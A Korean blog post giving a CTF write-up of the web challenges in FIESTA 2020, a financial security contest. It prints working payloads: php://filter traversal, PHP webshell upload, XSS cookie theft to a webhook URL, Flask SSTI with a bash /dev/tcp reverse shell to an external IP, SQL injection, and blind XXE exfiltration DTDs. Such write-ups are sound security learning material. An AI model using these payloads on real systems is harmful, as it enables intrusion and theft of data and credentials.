---

layout: post
title: "2020 FIESTA(금융보안원) CTF Write up"
excerpt: "Hard life"
categories: [Web,ctf]
comments: true
---

오랜만에 CTF를 참여했다.  금융보안원에서 진행하는 [FIESTA 2020 : 금융보안 위협분석 대회]인데, 대회 랭킹으로는 3위를 취득했다.

N0Named팀에서 참가를 하였고, 팀명도 N0Named로 참가하였다. 

한 문제파일 및 url에 3가지 문제가 겹쳐있는 형식이었고, 모든 문제를 해결했는데, 웹만 wirte up을 작성하려고 한다.

![fiesta](/img/fiesta1.png)

<h3>0x0. YoUrAT
</h3>

Markdown형식으로 note에 글을 작성할 수 있다.  이를 이용해서 코드를 릭할 수 있다.

```markdown
![alt](php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd)
```

이렇게 글을 작성하여 etc/passwd 코드를 릭해오는 것을 확인했다.

```markdown
![alt](php://filter/convert.base64-encode/resource=../../../../../../../flag)
```

이 페이로드로 최상위 디렉터리에서 플래그를 가져온게 1번 정답이었다.

그 다음 이를 이용하여 index.php의 코드를 릭해오고, 해석하면 write.php가 존재하는 것을 확인할 수 있다. 그런데 이 파일은 암호화 되어있어서 이를 복호화하기 위한 방법을 찾던 도중, 

```markdown
![alt](php://filter/convert.base64-encode/resource=/adm1nkyj_guard.so) 
```

이를 통해서 얻은 파일을 ida로 열어보니 암호화 코드가 있었고, 이를 이용하여 디크립트 코드를 작성했다.

```python
import base64
import re
text = """
write.php 코드
"""

check = re.findall("\$_[0-9a-z]*",text)
check.sort(reverse=True)
for i in check:
   text = text.replace(i, "$_"+xor2(i[2:].decode("hex"),"\x21"))

check = re.findall("\'_[0-9a-z]*\'",text)
check.sort(reverse=True)
for i in check:
   text = text.replace(i, "'"+xor2(i[2:-1].decode("hex"),"\x21")+"'")


check = re.findall("\"_[0-9a-z]*\"",text)
check.sort(reverse=True)
for i in check:
   text = text.replace(i, "\""+xor2(i[2:-1].decode("hex"),"\x21")+"\"")

check = re.findall("_[0-9a-z]*\(",text)
check.sort(reverse=True)
for i in check:
   try:
      text = text.replace(i, xor2(i[1:-1].decode("hex"),"\x21")+"(")
   except:
      pass

print text
```

이를 통하여 복호화를 진행하니 플래그가 나왔다.

```php
if ('thisisbackdoor' === 'thisisbackdoor') {
        if (file_get_contents('http://13.125.25.152/?id=' . $_SESSION['id'] . '&content=' . base64_encode($_POST['content']))) {
            $_go = 'FIESTA2020{';
            $_go .= 'wow_you_are_php_master_XD';
            $_go .= '}';
        }
    }
```

여기 플래그가 2번 플래그였다. 이후 저 링크에 들어가서 웹쉘을 이용하여 플래그를 취득했다.

```
http://13.125.25.152?id=kangsecu.php&content=<?php system($_GET['cmd']);?> 
```

를 이용하여 웹쉘을 업로드 후 

```
http://13.125.25.152/memos/kangsecu.php?cmd=/bin/sh;cd ../../../../../cat flag
```

이렇게 3번까지 해결했다.

<h3> 0x1. DarknetMarket</h3>

이 문제는 1번은 xss를 이용하여 어드민 쿠키를 취득하여 플래그를 읽는 것이었다.

```javascript
<script>document.location='https://webhook.site/cd701ca7-b14d-49dd-bc9c-5e188ed925a6/?P='+document.cookie</script>
```

이런 코드를 .phtml로 작성하고 업로드하여 진행하면 쿠키탈취가 가능하다. 이게 1번 플래그였다.

그 다음 1번에서 취득한 어드민 권한으로 접속하면 업로드 된 글들에 코멘트를 달 수 있는데, 여기서 uwsgi를 사용한 프론트는 아파치고, 백엔드는 플라스크라는게 생각나서 SSTI를 진행했다.

```python
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}} 
```

를 이용하여 내부 디렉터리에 파일들을 출력하고 flag가 있길래 읽어왔다.

```python
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}} 
```

이게 2번 정답이다. 3번은 여기서 SSTI를 이용하여 리버스쉘을 취득해서 nc에서 진행하였다.

```python
`{{config.__class__.__init__.__globals__['os'].popen('/bin/bash-c"/bin/bash-i>&/dev/tcp/49.247.132.71/12345 0>&1"').read()}}`
```

이를 이용하여 우리 서버에 리버스쉘을 연결하고 nc를 열어서 app.py코드를 확인하고 db정보를 취득했다.

그 결과 user:memo에 어드민의 글이 존재하는걸 확인해서  

```sql
mysql -u dev -p -e "select memo from DKNetM.user where memo like ‘%FIESTA%’"
```

이 페이로드를 이용하여 플래그를 출력한게 3번이었다.



<h3>0x2. Auditor

이번에는  sql인젝션 문제였다. 1번은 그냥 로그인 후  보드에서 download.php?idx= 를 넘겨주는 부분에서 타임베이스드 sql인젝션이 가능했다.  select flag from flag를 통하여 플래그를 취득했다.

2번은  1번과 마찬가지로 idx파라미터에서 union select 인젝션을 통해서 index.php코드를 릭하고 분석하여  파일이 업로드 되는 경로를 릭할 수 있었다.  그 이후 회원가입을 할 때, include 트리거를 했다.

```python
id=kcq&pw=kcq&name=kcq&email=kcq%40naver.com&phone= kcq &gender=1,1,0x2720756e696f6e2073656c65637420312c272f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f7661722f7777772f68746d6c2f66696c65732f6562646438303636383732396530616139636661343832336663313161366663393337323263323636636664616337336235623832653162383839312e6a7067272c312c3123)%23
```

여기서 업로드 된 파일은 이미 웹쉘의 형태로 다른 계정에서 업로드 해둔 것이다. 그리고 그 경로는 다음 코드를 통해서 확인할 수 있다.  

```php
function get_theme($pos){
        global $db_conn;

        if(is_login()){
            $query = "SELECT theme_idx FROM user WHERE id='{$_SESSION['id']}'";
            $result = mysqli_query($db_conn, $query);
            $row = mysqli_fetch_array($result);
            if($row){
                $_skin = $row['theme_idx'];
            }else{
                $_skin = 1;
            }
        }else{
            $_skin = 1;
        }
        $query = "SELECT * FROM theme WHERE theme_idx='{$_skin}' and position='{$pos}'";
        $result = mysqli_query($db_conn, $query);
        $row = mysqli_fetch_array($result);
        if (isset($row['path'])){
            return $row['path'];
        }
    }
```

이제 theme_idx를 조작하면 된다.  그 후 업로드 경로를 통해서 웹쉘을 실행 후 명령어를 전송하고 index.ph코드를 확인하면 2번 플래그가 존재한다. 또한 업로드한 웹쉘을 이용하여 쉘을 따고 찾다보면 3번 플래그가 나온다.



<h3>0x3. PowerSehllCode</h3>

이 문제는 3번만 웹이 이용되었다. XXE기법을 이용하여 C2서버에서 플래그를 읽는 것이다. 처음에는 그냥 XXE를 시도했는데 내가 못한건지 잘 되지 않아서 바인드XXE를 진행하였다.

내 서버에 ext.dtd파일을 아래와 같이 생성했다.

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://개인서버/?p=%file;'>">
<!ENTITY var "%file;">
%eval;
%error;
```

그 후 문제 서버에 아래 페이로드를 전송하였다.

```xml
command=IRIMFxIi&sec=fiesta2020&data=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://개인서버/ext.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
```

그러니 index.php의 코드가 내 서버로 긁어졌다. 이를 분석하고 서버 내에 . /_readme_only_admin.php 파일에 플래그가 존재하는 것을 알아냈다. 이제 추가로 XXE를 이용하여 이를 읽어왔다.

```php
<?php
$flags = shell_exec('flags2');
if ($_SERVER['REMOTE_ADDR']!='127.0.0.1') {
echo "you are not admin!!";
} else {
echo $flags;
}
?>
```

그런데 이를 127.0.0.1에서 접속하여 실행을 해야해서 다시 ext.dtd를 수정해서 xxe를 시도했다.

```xml-dtd
<!ENTITY % file SYSTEM "http://127.0.0.1/_readme_only_admin.php">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://webhook.site/aa/?p=%file;'>">
<!ENTITY var "%file;">
%eval;
%error;
```

이를 통해서 플래그를 취득했다.

<h3>0x4. Evidence

이 문제는 3번만 웹이 이용되었다. 암호화를 진행하는데 사용된 키를 c2서버 웹에서 받아와야 하는 문제였다.

http://15.165.143.41:9999 에 접속하면 dir들이 리스팅되는데, http://15.165.143.41:9999/webpanel/createkeys.php에 키를 요청했더니 에러가 발생하며 http://15.165.143.41:9999/webpanel/lib가 존재하는것을 알려줬다. 그 후, 

http://15.165.143.41:9999/webpanel/lib/Crypt/AES.php 에 접속하니 xml형태로 RSA키와 AES 암호문이 존재했다.

